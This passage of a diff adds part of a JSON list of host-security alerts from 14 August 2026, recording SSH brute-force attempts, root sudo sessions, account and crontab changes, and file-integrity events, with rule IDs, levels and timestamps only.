+      "timestamp": "2026-08-14T09:11:01.153Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:11:01.005Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:59.638Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:58.863Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:58.772Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:58.521Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:57.702Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:57.118Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.911Z"
+    },
+    {
+      "rule_id": "5902",
+      "description": "New user added to the system.",
+      "level": 8,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5555",
+      "description": "PAM: User changed password.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5903",
+      "description": "Group (or user) deleted from the system.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5901",
+      "description": "New group added to the system.",
+      "level": 8,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.229Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.212Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.158Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.158Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.150Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.142Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.128Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.120Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:56.107Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.096Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.087Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.080Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.053Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.042Z"
+    },
+    {
+      "rule_id": "5903",
+      "description": "Group (or user) deleted from the system.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.025Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.025Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.024Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.024Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:56.021Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.020Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.016Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:56.004Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.978Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.970Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.946Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.940Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.923Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.916Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.901Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.896Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.896Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.891Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.891Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.885Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.878Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.869Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.860Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.857Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.845Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.838Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.830Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.830Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:55.829Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.822Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.821Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:55.816Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5901",
+      "description": "New group added to the system.",
+      "level": 8,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5555",
+      "description": "PAM: User changed password.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5902",
+      "description": "New user added to the system.",
+      "level": 8,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.211Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:55.202Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.803Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.802Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.796Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.795Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.786Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.775Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.760Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.743Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.734Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.726Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.707Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.693Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.686Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.676Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.665Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.658Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.651Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.636Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.630Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.624Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.610Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.600Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.591Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.587Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.573Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:54.565Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.542Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:54.212Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:54.212Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:54.212Z"
+    },
+    {
+      "rule_id": "2832",
+      "description": "Crontab entry changed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:54.211Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:54.006Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:54.006Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:54.005Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:53.835Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:53.721Z"
+    },
+    {
+      "rule_id": "2832",
+      "description": "Crontab entry changed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:53.202Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:52.618Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:52.190Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:52.002Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:50.176Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:50.176Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:50.175Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:50.011Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:50.001Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:49.125Z"
+    },
+    {
+      "rule_id": "5551",
+      "description": "PAM: Multiple failed logins in a small period of time.",
+      "level": 10,
+      "timestamp": "2026-08-14T09:10:48.181Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:48.181Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:47.125Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:47.125Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:46.159Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:45.121Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:42.043Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:42.042Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:42.041Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:41.985Z"
+    },
+    {
+      "rule_id": "5712",
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "level": 10,
+      "timestamp": "2026-08-14T09:10:41.985Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:41.074Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:40.015Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:40.015Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:39.041Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:39.040Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:38.008Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:38.006Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:38.003Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:37.982Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:37.041Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-08-14T09:10:37.040Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.003Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.003Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.003Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.003Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.003Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.002Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.002Z"
+    },
+    {
+      "rule_id": "5715",
+      "description": "sshd: authentication success.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:36.002Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.982Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.982Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.982Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.982Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.982Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.982Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.981Z"
+    },
+    {
+      "rule_id": "5715",
+      "description": "sshd: authentication success.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:10:35.981Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:10:35.960Z"
+    }
+  ]
+}
